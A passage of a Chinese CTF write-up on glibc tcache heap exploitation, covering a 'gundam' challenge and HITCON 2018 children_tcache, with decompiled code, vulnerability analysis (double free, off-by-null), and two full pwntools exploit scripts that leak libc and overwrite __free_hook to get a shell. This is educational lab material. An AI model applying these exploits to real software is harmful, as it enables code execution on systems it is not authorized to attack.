          case 4u:
            blow_up();
            break;
          case 5u:
            puts("Exit....");
            exit(0);
            return;
          default:
            puts("Invalid choice");
            break;
        }
      }
    }
菜单功能如下：
  * Build：申请一块0x28大小的chunk用来存储gundam的结构体 `struct gundam{ int inuse; char* name; char type[24] }`，其中`name`为0x100大小。最多创建9个gundam。
  * Visit：打印gundam的`name`及`type`
  * Destory：free指定gundam的`name`，没有清空指针，可`double free`
  * Blowup：free所有已经destory过的gundam，并清空指针。
思路分析：
  1. 第一步依然是泄露libc地址
  2. 本题我们不能控制malloc的大小，因此不能使用上一题的方法一，只能使用方法二。本题最多可以创建9个gundam，很容易就能把`tcache`填满7个，之后的free掉的chunk就会放到`unsorted bin`。接着使用visit功能泄露`unsorted bin`的fd即可。
  3. 使用`tcache dup`进行任意地址写
  4. `tcache dup`类似`fastbin dup`，利用的是 `tcache_put()` 的不严谨可以对同一个chunk多次 free，`tcache_put()` 的检查几乎等于没有，fastbin不能连续释放同一个chunk，而且还需选择大小合适的位置，而`tcache`没有这种限制，使用起来比`fastbin dup`还要简单。使用destory功能进行`double free`后，接着新建两个gundam后即可分配到指定位置，修改`free_hook`为`system`或`onegadget`即可getshell。
完整exp：
    from pwn import *
    p = process('./gundam')
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
    def bulid(name):
        p.sendlineafter('Your choice :','1')
        p.sendafter('name of gundam :',name)
        p.sendlineafter('type of the gundam :','1')
    def destory(idx):
        p.sendlineafter('Your choice :','3')
        p.sendlineafter('Destory:',str(idx))
    def visit():
        p.sendlineafter('Your choice :','2')
    def blow_up():
        p.sendlineafter('Your choice :','4')
    # leak libc address
    for i in range(9):
        bulid('aaaa')
    for i in range(9):
        destory(i)
    blow_up()
    for i in range(7):
        bulid('bbbb')
    bulid('cccccccc')
    visit()
    libc.address = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 0x3ebc40 - 96
    success('libc.address:{:#x}'.format(libc.address))
    # tcache dup
    destory(1)
    destory(0)
    destory(0)
    blow_up()
    bulid(p64(libc.sym['__free_hook'])) # 0
    bulid('/bin/sh\x00') # 1
    bulid(p64(libc.sym['system']))
    # getshell
    destory(1)
    p.interactive()
## hitcon2018 children_tcache
题目功能不多，就3个，我们来一一分析。
    $$$$$$$$$$$$$$$$$$$$$$$$$$$
        Children Tcache    
    $$$$$$$$$$$$$$$$$$$$$$$$$$$
    $   1. New heap           $
    $   2. Show heap          $
    $   3. Delete heap        $
    $   4. Exit               $
    $$$$$$$$$$$$$$$$$$$$$$$$$$$
    Your choice:
    void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
    {
      unsigned __int64 v3; // rax
      sub_AEB();
      while ( 1 )
      {
        while ( 1 )
        {
          menu();
          v3 = get_int();
          if ( v3 != 2 )
            break;
          show();
        }
        if ( v3 > 2 )
        {
          if ( v3 == 3 )
          {
            delete();
          }
          else
          {
            if ( v3 == 4 )
              _exit(0);
    LABEL_13:
            puts("Invalid Choice");
          }
        }
        else
        {
          if ( v3 != 1 )
            goto LABEL_13;
          new();
        }
      }
    }
菜单功能如下：
  1. new：创建一个heap（最多10个），可控制size，由于使用了`strcpy(dest, &s)`（把从src地址开始且含有NULL结束符的字符串复制到以dest开始的地址空间），存在一个`off by null`漏洞。
    unsigned __int64 new()
    {
      signed int i; // [rsp+Ch] [rbp-2034h]
      char *dest; // [rsp+10h] [rbp-2030h]
      unsigned __int64 size; // [rsp+18h] [rbp-2028h]
      char s; // [rsp+20h] [rbp-2020h]
      unsigned __int64 v5; // [rsp+2038h] [rbp-8h]
      v5 = __readfsqword(0x28u);
      memset(&s, 0, 0x2010uLL);
      for ( i = 0; ; ++i )
      {
        if ( i > 9 )
        {
          puts(":(");
          return __readfsqword(0x28u) ^ v5;
        }
        if ( !heap_list[i] )
          break;
      }
      printf("Size:");
      size = get_int();
      if ( size > 0x2000 )
        exit(-2);
      dest = (char *)malloc(size);
      if ( !dest )
        exit(-1);
      printf("Data:");
      get_str((__int64)&s, size);  // 有00截断
      strcpy(dest, &s);   // off by null
      heap_list[i] = dest;
      size_list[i] = size;
      return __readfsqword(0x28u) ^ v5;
    }
  1. show：打印指定index的heap
    int show()
    {
      const char *v0; // rax
      unsigned __int64 v2; // [rsp+8h] [rbp-8h]
      printf("Index:");
      v2 = get_int();
      if ( v2 > 9 )
        exit(-3);
      v0 = heap_list[v2];
      if ( v0 )
        LODWORD(v0) = puts(heap_list[v2]);
      return (signed int)v0;
    }
  1. delete：free指定index的heap，并且清空了指针。`memset((void *)heap_list[v1], 0xDA, size_list[v1]);`free前填充了`\xda`。
    int delete()
    {
      unsigned __int64 v1; // [rsp+8h] [rbp-8h]
      printf("Index:");
      v1 = get_int();
      if ( v1 > 9 )
        exit(-3);
      if ( heap_list[v1] )
      {
        memset((void *)heap_list[v1], 0xDA, size_list[v1]); // 坑点
        free((void *)heap_list[v1]);
        heap_list[v1] = 0LL;
        size_list[v1] = 0LL;
      }
      return puts(":)");
    }
题目分析：
  * 这题比较麻烦的是没有一个很直接的`double free`漏洞可以利用，delete的时候清空了指针。而比较明显的漏洞就是`off by null`，那么关键就是如何利用这个漏洞了。
  * 由于分配的heap空间是连续的，可以利用`off by null`把下一个chunk的size值的最低位覆盖成`\x00`，同时放入一个合适`pre_size`值，把前面已分配的chunk伪造成一个已free的chunk，当free此chunk时会进行向前合并，造成`overlapping chunks`。
  * 题目可以控制malloc的大小，因此选择创建一个可以放入`unsorted bin`的chunk进行libc地址泄露。
解题步骤：
  * 申请两个大于`tcache`范围的heap，中间预留一个heap（`tcache`范围内即可）做备用，依次记作`#0，#1，#2`，对应下图的第2-4个chunk。
  * 把`#0`和`#1`两个heap释放掉，此时`#0`号进入`unsorted bins`，`#1`号进入`tcache`。
  * 申请一个`#1`号大小的heap（`#0'`），利用`off by null`修改掉`#2`号heap的`size`，还要改掉`pre_size`，当free掉`#2`号heap时即可发生向前合并，此时`#0'`号heap将与`unsorted bin`重叠。
  * 申请一个`#0`号大小的heap，这时`#0'`号与分割后的`unsorted bin`的`fd`重叠，打印`#0'`号heap信息即可泄露libc地址。
  * 申请一个`#0'`号大小的heap(`#2'`)，`#0'`和`#2'`将重叠，可以进行`double free`。
  * 跟着就是`tcache dup`的常规套路。
坑点：
  * 由于delete的时候填充了垃圾数据`\xDA`，而且new的时候写入是有`\x00`截断，因此需要利用`strcpy`会复制末尾`\x00`的特点，不停改变新建heap的大小，然后删除，一字节一字节地把`\xDA`清空掉，之后才能正确填充`pre_size`。
完整EXP：
    from pwn import *
    p = process('./children_tcache')
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
    def new(size,content):
        p.sendlineafter('Your choice: ','1')
        p.sendlineafter('Size:',str(size))
        p.sendafter('Data:',content)
    def show(idx):
        p.sendlineafter('Your choice: ','2')
        p.sendlineafter('Index:',str(idx))
    def delete(idx):
        p.sendlineafter('Your choice: ','3')
        p.sendlineafter('Index:',str(idx))
    # unsorted bins > 0x408
    new(0x410,'0000')    #0
    new(0x20,'1111')     #1
    new(0x4f0,'2222')    #2
    new(0x20,'3333')     #3
    delete(0)
    delete(1)
    # overwrite next chunk size & clean pre_size
    for i in range(0,9):
        new(0x28-i,(0x28-i)*'a')   #0
        delete(0)
    # overlapping chunks
    new(0x28,'a'*0x20+p64(0x450))  #0
    delete(2)
    new(0x418,'1111')   #1
    show(0)
    libc.address = u64(p.recv(6).ljust(8,'\x00')) - 0x3ebc40 - 96
    success('libc.address:{:#x}'.format(libc.address))
    # overwrite free_hook to onegadget
    new(0x28,'2222') #2
    delete(0)
    delete(2) # 0 = 2
    new(0x28,p64(libc.sym['__free_hook']))
    new(0x28,'3333')
    one_gadget = libc.address + 0x4f322
    new(0x28,p64(one_gadget))
    delete(3)
    p.interactive()
## 总结
tcache的安全检查特别少，利用起来比较简单，此类题目的主要难点在于如何泄露libc地址以及如何创建重叠堆块。这3个题目基本把libc泄露，tcache
poisoning，tcache dup，overlapping chunks都涵盖，值得学习一下。